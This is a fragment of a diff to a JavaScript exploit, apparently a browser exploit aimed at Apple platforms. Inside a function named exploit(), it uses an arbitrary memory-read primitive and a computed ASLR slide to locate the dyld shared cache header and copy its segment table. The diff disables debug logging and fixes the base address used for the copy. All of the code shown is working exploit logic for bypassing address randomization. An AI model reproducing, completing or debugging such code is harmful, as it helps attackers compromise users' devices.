@@ -458,7 +458,7 @@ function exploit(){
         var dcache_base = Add(new Int64('0x180000000'),slide);
         var hdr = Sub(dcache_base,new Int64('0x000000020'));
         log('[+] Dyld shared cache should be @' + hdr);
-        log('[+] cache magic' + memory.read_i32(hdr,0x4))
+        //log('[+] cache magic' + memory.read_i32(hdr,0x4))
         /*
         log(hex(hdr - anchor))
         for (;;) {
@@ -509,8 +509,8 @@ function exploit(){
         */
         var dcache_nsegs = memory.read_i32(hdr + new Int64('0x14'));
         log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segs');
-        log(memory.read_i32(hdr,0x10) + 'vs' + memory.read_i32(hdr+0x10,0));
-        var dcache_segdata = memory.copyfrom(Add(hdr, memory.read_i32(Add(hdr, 0x10))), 0, dcache_nsegs * 0x20);
+        //log(memory.read_i32(hdr,0x10) + 'vs' + memory.read_i32(hdr+0x10,0));
+        var dcache_segdata = memory.copyfrom(Add(dcache_base, memory.read_i32(Add(hdr, 0x10))), 0, dcache_nsegs * 0x20);
         var dcache_segs = [];
         for(var i = 0; i < dcache_nsegs; i++){
             var off = i * 0x20;
